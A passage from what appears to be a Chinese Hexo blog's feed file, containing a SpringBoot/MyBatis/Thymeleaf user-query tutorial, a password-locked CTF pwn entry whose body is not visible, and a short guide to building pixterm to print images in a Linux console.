title="mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper.xml中实现接口和数据库的交互。"></a>mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper.xml中实现接口和数据库的交互。</h3><h3 id="service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。"><a href="#service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。" class="headerlink" title="service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。"></a>service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。</h3><h3 id="在resources类中创建一个包，用于存放Mapper-xml"><a href="#在resources类中创建一个包，用于存放Mapper-xml" class="headerlink" title="在resources类中创建一个包，用于存放Mapper.xml"></a>在resources类中创建一个包，用于存放Mapper.xml</h3><h3 id="具体分布如下图所示"><a href="#具体分布如下图所示" class="headerlink" title="具体分布如下图所示"></a>具体分布如下图所示</h3><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/1.png" class="lazyload"></a></p><h2 id="3、代码实现"><a href="#3、代码实现" class="headerlink" title="3、代码实现"></a>3、代码实现</h2><hr><h3 id="controller层：UserController"><a href="#controller层：UserController" class="headerlink" title="controller层：UserController"></a>controller层：UserController</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.controller;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import com.example.demo.service.UserServiceImpl;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import java.util.List;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping("/testBoot")</span><br><span class="line">public class UserController {</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserService userService;</span><br><span class="line">    @RequestMapping(value = "/getUsers",method = RequestMethod.GET)</span><br><span class="line">    public List<user> GetUsers(){</user></span><br><span class="line">        return userService.getUsers();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="entity层：User"><a href="#entity层：User" class="headerlink" title="entity层：User"></a>entity层：User</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.entity;</span><br><span class="line">public class User {</span><br><span class="line">    private Integer id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String account;</span><br><span class="line">    private String password;</span><br><span class="line">    private String email;</span><br><span class="line">    @Override</span><br><span class="line">    public String toString() {</span><br><span class="line">        return "id = " + getId();</span><br><span class="line">    }</span><br><span class="line">    public void setId(Integer id) {</span><br><span class="line">        this.id = id;</span><br><span class="line">    }</span><br><span class="line">    public Integer getId() {</span><br><span class="line">        return id;</span><br><span class="line">    }</span><br><span class="line">    public String getName() {</span><br><span class="line">        return name;</span><br><span class="line">    }</span><br><span class="line">    public void setName(String name) {</span><br><span class="line">        this.name = name;</span><br><span class="line">    }</span><br><span class="line">    public void setAccount(String account) {</span><br><span class="line">        this.account = account;</span><br><span class="line">    }</span><br><span class="line">    public String getAccount() {</span><br><span class="line">        return account;</span><br><span class="line">    }</span><br><span class="line">    public void setPassword(String password) {</span><br><span class="line">        this.password = password;</span><br><span class="line">    }</span><br><span class="line">    public String getPassword() {</span><br><span class="line">        return password;</span><br><span class="line">    }</span><br><span class="line">    public void setEmail(String email) {</span><br><span class="line">        this.email = email;</span><br><span class="line">    }</span><br><span class="line">    public String getEmail() {</span><br><span class="line">        return email;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="mapper层：UserMapper"><a href="#mapper层：UserMapper" class="headerlink" title="mapper层：UserMapper"></a>mapper层：UserMapper</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.mapper;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import org.springframework.stereotype.Repository;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Repository</span><br><span class="line">public interface UserMapper {</span><br><span class="line">    List<user> getUsers();</user></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="service层：UserService"><a href="#service层：UserService" class="headerlink" title="service层：UserService"></a>service层：UserService</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.service;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import com.example.demo.mapper.UserMapper;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Service;</span><br><span class="line">import org.springframework.transaction.annotation.Transactional;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Service</span><br><span class="line">@Transactional</span><br><span class="line">public class UserService {</span><br><span class="line">    @Autowired</span><br><span class="line">    UserMapper userMapper;</span><br><span class="line">    public List<user> getUsers() {</user></span><br><span class="line">        return userMapper.getUsers();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="mapping-xml配置：UserMapper-xml"><a href="#mapping-xml配置：UserMapper-xml" class="headerlink" title="mapping.xml配置：UserMapper.xml"></a>mapping.xml配置：UserMapper.xml</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><!--?xml version="1.0" encoding="UTF-8"?--></span><br><span class="line"></span><br><span class="line"><mapper namespace="com.example.demo.mapper.UserMapper"></mapper></span><br><span class="line">    <resultmap id="user" type="com.example.demo.entity.User"></resultmap></span><br><span class="line">        <result column="id" jdbctype="INTEGER" property="id"></result></span><br><span class="line">        <result column="name" jdbctype="VARCHAR" property="name"></result></span><br><span class="line">        <result column="account" jdbctype="VARCHAR" property="account"></result></span><br><span class="line">        <result column="password" jdbctype="VARCHAR" property="password"></result></span><br><span class="line">        <result column="email" jdbctype="VARCHAR" property="email"></result></span><br><span class="line">    </span><br><span class="line">    <select id="getUsers" resultmap="user">        select * from user    </select></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行效果："><a href="#运行效果：" class="headerlink" title="运行效果："></a>运行效果：</h2><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/2.png" class="lazyload"></a></p><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><h3 id="1、如果service层-Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加-Repository"><a href="#1、如果service层-Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加-Repository" class="headerlink" title="1、如果service层@Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加@Repository"></a>1、如果service层@Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加@Repository</h3><h3 id="2、请注意mapper-xml文件中的目录，若报错，请注意查看"><a href="#2、请注意mapper-xml文件中的目录，若报错，请注意查看" class="headerlink" title="2、请注意mapper.xml文件中的目录，若报错，请注意查看"></a>2、请注意mapper.xml文件中的目录，若报错，请注意查看</h3><h1 id="带参数的输出某id的数据库数据"><a href="#带参数的输出某id的数据库数据" class="headerlink" title="带参数的输出某id的数据库数据"></a>带参数的输出某id的数据库数据</h1><h2 id="1、UserMapper-java需要加上getUser-Integer-id"><a href="#1、UserMapper-java需要加上getUser-Integer-id" class="headerlink" title="1、UserMapper.java需要加上getUser(Integer id)"></a>1、UserMapper.java需要加上getUser(Integer id)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.mapper;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import org.springframework.stereotype.Repository;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Repository</span><br><span class="line">public interface UserMapper {</span><br><span class="line">    List<user> getUsers();</user></span><br><span class="line">    User getUser(Integer id);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="2、UserService-java需要定义getUser-Integer-id"><a href="#2、UserService-java需要定义getUser-Integer-id" class="headerlink" title="2、UserService.java需要定义getUser(Integer id)"></a>2、UserService.java需要定义getUser(Integer id)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.service;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import com.example.demo.mapper.UserMapper;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Service;</span><br><span class="line">import org.springframework.transaction.annotation.Transactional;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Service</span><br><span class="line">@Transactional</span><br><span class="line">public class UserService {</span><br><span class="line">    @Autowired</span><br><span class="line">    UserMapper userMapper;</span><br><span class="line">    public List<user> getUsers() {</user></span><br><span class="line">        return userMapper.getUsers();</span><br><span class="line">    }</span><br><span class="line">    public User getUser(Integer id){</span><br><span class="line">        return userMapper.getUser(id);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="3、UserController添加新的业务"><a href="#3、UserController添加新的业务" class="headerlink" title="3、UserController添加新的业务"></a>3、UserController添加新的业务</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.example.demo.service.UserService;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import java.util.List;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping("/testBoot")</span><br><span class="line">public class UserController {</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserService userService;</span><br><span class="line">    @RequestMapping(value = "/getUsers",method = RequestMethod.GET)</span><br><span class="line">    public List<user> getUsers(){</user></span><br><span class="line">        return userService.getUsers();</span><br><span class="line">    }</span><br><span class="line">    @RequestMapping(value = "getUser",method = RequestMethod.GET)</span><br><span class="line">    public User getUser(@RequestParam(value="id",required = true) Integer id){</span><br><span class="line">        return userService.getUser(id);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="4、UserMapper-xml需要添加新的sql语句"><a href="#4、UserMapper-xml需要添加新的sql语句" class="headerlink" title="4、UserMapper.xml需要添加新的sql语句"></a>4、UserMapper.xml需要添加新的sql语句</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><!--?xml version="1.0" encoding="UTF-8"?--></span><br><span class="line"></span><br><span class="line"><mapper namespace="com.example.demo.mapper.UserMapper"></mapper></span><br><span class="line">    <resultmap id="user" type="com.example.demo.entity.User"></resultmap></span><br><span class="line">        <result column="id" jdbctype="INTEGER" property="id"></result></span><br><span class="line">        <result column="name" jdbctype="VARCHAR" property="name"></result></span><br><span class="line">        <result column="account" jdbctype="VARCHAR" property="account"></result></span><br><span class="line">        <result column="password" jdbctype="VARCHAR" property="password"></result></span><br><span class="line">        <result column="email" jdbctype="VARCHAR" property="email"></result></span><br><span class="line">    </span><br><span class="line">    <select id="getUsers" resultmap="user">        select * from user    </select></span><br><span class="line">    <select id="getUser" resultmap="user">        select * from user                    id = #{id}            </select></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/3.png" class="lazyload"></a></p><h1 id="通过thymeleaf显示数据库数据"><a href="#通过thymeleaf显示数据库数据" class="headerlink" title="通过thymeleaf显示数据库数据"></a>通过thymeleaf显示数据库数据</h1><hr><h2 id="1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。"><a href="#1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。" class="headerlink" title="1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。"></a>1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。</h2><h2 id="2、UserView代码如下"><a href="#2、UserView代码如下" class="headerlink" title="2、UserView代码如下"></a>2、UserView代码如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.view;</span><br><span class="line"></span><br><span class="line">import com.example.demo.service.UserService;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(value = "user_view")</span><br><span class="line">public class UserView {</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserService userService;</span><br><span class="line">    @RequestMapping(value = "/test")</span><br><span class="line">    public String user_view(@RequestParam(value = "id",required = false) Integer id, Model model){</span><br><span class="line">        model.addAttribute("user_data",userService.getUser(id));</span><br><span class="line">        return "index";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下"><a href="#3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下" class="headerlink" title="3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下"></a>3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <meta charset="UTF-8"></span><br><span class="line">    <title>Title</title></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><p th:text="${user_data.name}"></p></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行效果如下："><a href="#运行效果如下：" class="headerlink" title="运行效果如下："></a>运行效果如下：</h2><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/4.png" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-OGeek-OVM-VMPwn详解</title>
      <link href="/2019/10/13/CTF-Pwn-OGeek-OVM-VMPwn%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/10/13/CTF-Pwn-OGeek-OVM-VMPwn%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="d91d1f39f4c8d687860535a7fd89aeda9358224ad8a1c272542f0241f24ff989"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-控制台输出图片</title>
      <link href="/2019/10/10/Linux-%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E5%9B%BE%E7%89%87/"/>
      <url>/2019/10/10/Linux-%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Linux-控制台输出图片"><a href="#Linux-控制台输出图片" class="headerlink" title="Linux-控制台输出图片"></a>Linux-控制台输出图片</h1><h2 id="由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下："><a href="#由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下：" class="headerlink" title="由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下："></a>由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下：</h2><h2 id="安装Go编译器"><a href="#安装Go编译器" class="headerlink" title="安装Go编译器"></a>安装Go编译器</h2><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制台输出一下代码</span><br><span class="line">apt install golang-go</span><br></pre></td></tr></tbody></table></figure></div><h2 id="下载配置-pixterm"><a href="#下载配置-pixterm" class="headerlink" title="下载配置 pixterm"></a>下载配置 pixterm</h2><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/eliukblau/pixterm</span><br><span class="line">然后输入以下指令</span><br><span class="line">go build pixterm.go</span><br><span class="line">对pixterm.go源码进行编译，但是会报错，我们就是需要它报错，然后知道它需要哪些包，同时它也会输出目录。</span><br><span class="line">通过git clone指令来下载文件包，然后把文件放到对应的位置，同时pixterm的位置也要变动，放到对应的gopath目录下。</span><br><span class="line">git clone https://github.com/lucasb-eyer/go-colorful</span><br><span class="line">git clone https://github.com/golang/crypto.git</span><br><span class="line">将pixterm目录也放到对应的位置</span><br></pre></td></tr></tbody></table></figure></div><h2 id="编译pixterm-go"><a href="#编译pixterm-go" class="headerlink" title="编译pixterm.go"></a>编译pixterm.go</h2><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build pixterm.go</span><br></pre></td></tr></tbody></table></figure></div><h3 id="然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了"><a href="#然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了" class="headerlink" title="然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了"></a>然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了</h3><h3 id="https-github-com-eliukblau-pixterm"><a href="#https-github-com-eliukblau-pixterm" class="headerlink" title="https://github.com/eliukblau/pixterm"></a><a href="https://github.com/eliukblau/pixterm" target="_blank" rel="noopener">https://github.com/eliukblau/pixterm</a></h3><h3 id="如果要保存ascii可通过以下指令"><a href="#如果要保存ascii可通过以下指令" class="headerlink" title="如果要保存ascii可通过以下指令"></a>如果要保存ascii可通过以下指令</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pixterm 图片名 > logo.txt</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-realloc_malloc_calloc详解</title>
